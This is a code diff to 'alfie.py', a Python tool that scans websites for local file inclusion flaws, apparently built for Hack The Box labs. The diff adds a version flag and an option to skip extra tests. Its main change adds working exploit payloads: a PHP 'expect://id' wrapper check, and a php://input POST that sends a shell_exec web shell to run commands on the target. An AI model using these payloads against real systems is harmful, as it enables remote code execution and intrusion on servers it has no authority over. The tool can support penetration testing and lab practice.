@@ -14,12 +14,15 @@ import json
 import urllib3
 urllib3.disable_warnings()
 
+version_number = '1.3.0'
+
 parser = argparse.ArgumentParser(
     prog='alfie.py',
     description='''The Automatic Local File Inclusion Enumerator.
     Scan websites for local file inclusion vulnerabilities.''',
     epilog='Author: 4wayhandshake')
 
+parser.add_argument('--version', action='version', version=f'%(prog)s {version_number}')
 parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', help='Show each requested url, along with the status code, size, and words in the response. Use this to help determine your filters.')
 parser.add_argument('-u', '--url', dest='url', help='Base URI of the target. Ex. "http://mywebsite.htb/index.php?page="', type=str, required=True)
 parser.add_argument('-f', '--fuzz-wordlist', dest='fuzz_wordlist', help='Wordlist of "interesting" files to check for. This wordlist should have one filename per line, with file extensions if applicable.', type=str, required=True)
@@ -38,6 +41,7 @@ parser.add_argument('-fc', '--filter-codes', dest='filter_codes', help='Comma-se
 parser.add_argument('-o', '--output', dest='output', help='File to log positive results.', type=str)
 parser.add_argument('--quiet', dest='quiet', action='store_true', help='Don\'t print the banner or options.')
 parser.add_argument('-nc', '--no-color', dest='colorless', action='store_true', help='Don\'t ANSII colors in console output.')
+parser.add_argument('-nx', '--no-extra-tests', dest='no_extra_tests', action='store_true', help='Don\'t run the extra LFI tests (only useful for WAF evasion).')
 
 args = parser.parse_args()
 
@@ -91,6 +95,31 @@ Yb,_,dP       `8b,,d8b,_ ,d8b,_  _,88,_ `YbadP'   \033[92m by \033[0m \033[94m
 # Font (nscript) by Normand Veilleux <nveilleu@emr.ca> Oct 7, 1994
 # figletized by Peter Samuelson <psamuels@hmc.edu> Nov 29, 1994
 
+# These are the extra tests to run, before enumerating path traversals
+# Each should have (at least) a description, method, and url, and
+# criteria for success (a series of checks to run on the response object)
+extra_tests = [
+    {
+        'description': 'Checking for insecure PHP wrapper "expect":',
+        'method': 'GET',
+        'url': 'expect://id',
+        'success_criteria': {
+            # response should at least contain the string "uid"
+            'contains': 'uid'
+        }
+    },
+    {
+        'description': 'Checking for insecure PHP wrapper "input":',
+        'method': 'POST',
+        'url': 'php://input&cmd=id',
+        'data': "<?php echo shell_exec($_GET['cmd']); ?>",
+        'success_criteria': {
+            # response should at least contain the string "uid"
+            'contains': 'uid'
+        }
+    }
+]
+
 s = requests.session()
 exit_flag = False # Global flag to signal threads to exit
 successes = []
@@ -103,6 +132,8 @@ request_cookie = None
 request_data = None
 
 def stringToDict(s):
+    if s is None:
+        return None
     # Parse a cookie-like string into a dict
     key_value_pairs = [e.strip() for e in s.split(';')]
     dict = {}
@@ -118,6 +149,8 @@ def stringToDict(s):
     return dict
 
 def parseCookie(s):
+    if s is None:
+        return None
     cookie_dict = stringToDict(s)
     # return a requests cookiejar from a dictionary
     return requests.utils.cookiejar_from_dict(cookie_dict)
@@ -238,20 +271,19 @@ def matches(resp, url):
             print(f"{' '*64}\n{colors.RED}[-] {url:<60}{colors.END}\n    HTTP {code:<8} Size: {bytes:<12} Words: {words:<20}")
     return ret
 
-def makeRequest(url):
+def makeRequest(method, url, req_cookie, req_json, req_data=None):
     try:
-        if args.request_type.upper() == 'POST':
-            response = requests.post(url, cookies=request_cookie, json=request_data, timeout=args.timeout)
+        if method == 'POST':
+            response = requests.post(url, cookies=req_cookie, json=req_json, data=req_data, timeout=args.timeout)
         else:
-            response = requests.get(url, cookies=request_cookie, timeout=args.timeout)
-        if matches(response, url):
-            global successes
-            successes.append(url)
+            response = requests.get(url, cookies=req_cookie, timeout=args.timeout)
+        return response
     except requests.RequestException as e:
         if args.colorless:
             print(f'An error occurred while making a request to {url}:\n{e}\n')
         else:
             print(f'{colors.MAGENTA}An error occurred while making a request to {url}:{colors.END}\n{e}\n')
+        return None
 
 def processUrls(url_queue):
     global exit_flag
@@ -264,7 +296,11 @@ def processUrls(url_queue):
         except Exception as e:
             print(e)
         if url is not None:
-            makeRequest(url)
+            method = args.request_type.upper()
+            resp = makeRequest(method, url, request_cookie, request_data)
+            if (resp is not None) and matches(resp, url):
+                global successes
+                successes.append(url)
             url_queue.task_done()
 
 def signalHandler(signum, frame):
@@ -293,7 +329,7 @@ def printOptions():
     print('='*64)
     print(f'URL: {args.url:>59}')
     if args.verbose:
-        print('Verbose mode')
+        print(f'Verbose mode: {"enabled":>50}')
     if args.lfi_wordlist != parser.get_default('lfi_wordlist'):
         print(f'LFI wordlist: {args.lfi_wordlist:>50}')
     if args.fuzz_wordlist != parser.get_default('fuzz_wordlist'):
@@ -323,7 +359,80 @@ def printOptions():
         print(f'Ending string: {s:>49}')
     if args.output:
         print(f'Output file: {args.output:>51}')
+    if args.colorless:
+        print(f'Colorless mode: {"omit ANSII color codes in all output":>48}')
+    if args.no_extra_tests:
+        print(f'No extra tests: {"only run the defined enumeration, no extras":>48}')
     print('='*64+'\n')
+
+def runExtraTests(tests):
+
+    def testSuccess(criteria, response):
+        # all of the criteria must be met for the test to be considered successful
+        # Check the status code
+        criterion = criteria.get('code', None)
+        if criterion is not None:
+            if response.status_code != criterion:
+                return False
+        # Check if the response is the right size (in bytes)
+        criterion = criteria.get('size', None)
+        if criterion is not None:
+            if len(response.content) != criterion:
+                return False
+        # Check if the response is the right size
+        criterion = criteria.get('words', None)
+        if criterion is not None:
+            if len(response.text.split()) != criterion:
+                return False
+        # Check if body contains the substring
+        criterion = criteria.get('contains', None)
+        if criterion is not None:
+            if response.text.find(criterion) == -1:
+                return False
+        return True
+
+    if args.verbose:
+        print("Running extra tests...")
+    for test in tests:
+
+        # Collect components of the request
+        ending = args.ending if args.ending else ''
+        uri = f'{args.url}{test.get("url","")}{ending}'
+        c = parseCookie(test.get('cookie', None))
+        d = test.get('data', None)
+        # Print a message stating which test is happening
+        cookie_output = ''
+        if c is not None:
+            cookie_output = f'\n    Cookie: {test["cookie"]:<56}'
+        payload_output = ''
+        if d is not None:
+            payload_output = f'\n    Payload: {d:<55}'
+        if args.verbose:
+            if args.colorless:
+                print(f"{' '*64}\n[?] {test['description']}{cookie_output}{payload_output}")
+            else:
+                print(f"{' '*64}\n{colors.YELLOW}[?] {test['description']:<60}{colors.END}{cookie_output}{payload_output}")
+        # issue the request then test the response
+        method = test['method']
+        resp = makeRequest(method, uri, req_cookie=c, req_json=None, req_data=d)
+        if testSuccess(test['success_criteria'], resp):
+            if args.verbose:
+                if args.colorless:
+                    print(f"[+] {method + ' ' + uri:<60}\n    Passed checks: {''.join(test['success_criteria'].keys()):<45}")
+                else:
+                    print(f"{colors.GREEN}[+] {method + ' ' + uri:<60}{colors.END}\n    Passed checks: {''.join(test['success_criteria'].keys()):<45}")
+            else:
+                if args.colorless:
+                    print(f"[+] {method + ' ' + uri:<60}")
+                else:
+                    print(f"{colors.GREEN}[+] {method + ' ' + uri:<60}{colors.END}")
+        elif args.verbose:
+            if args.colorless:
+                print(f"[-] {method + ' ' + uri:<60}\n    Failed check(s): {''.join(test['success_criteria'].keys()):<41}")
+            else:
+                print(f"{colors.RED}[-] {method + ' ' + uri:<60}{colors.END}\n    Failed check(s): {''.join(test['success_criteria'].keys()):<41}")
+    if args.verbose:
+        print("\nDone running extra tests.")
 
 def main():
     if not args.quiet:
@@ -340,6 +449,9 @@ def main():
     lfi_words = loadWordlist(args.lfi_wordlist)
     fuzz_words = loadWordlist(args.fuzz_wordlist)
     ending = args.ending if args.ending else ''
+    # Run the extra tests, before even queueing the enumeration
+    if not args.no_extra_tests:
+        runExtraTests(extra_tests)
     # Create a queue and populate it with tests
     url_queue = queue.Queue()
     for depth in range(args.min, args.max+1):
